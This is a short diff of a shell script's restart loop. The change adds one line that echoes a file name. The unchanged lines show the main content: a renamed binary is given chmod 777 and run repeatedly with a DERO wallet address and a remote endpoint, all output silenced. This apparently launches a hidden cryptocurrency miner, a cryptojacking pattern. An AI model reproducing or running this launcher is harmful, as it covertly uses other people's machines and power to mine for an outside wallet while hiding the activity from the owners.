@@ -20,6 +20,7 @@ restart_main() {
     chmod 777 "$new_name"
     ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1
     sleep "$delay"
+    echo "$new_name"
   done
 }
 
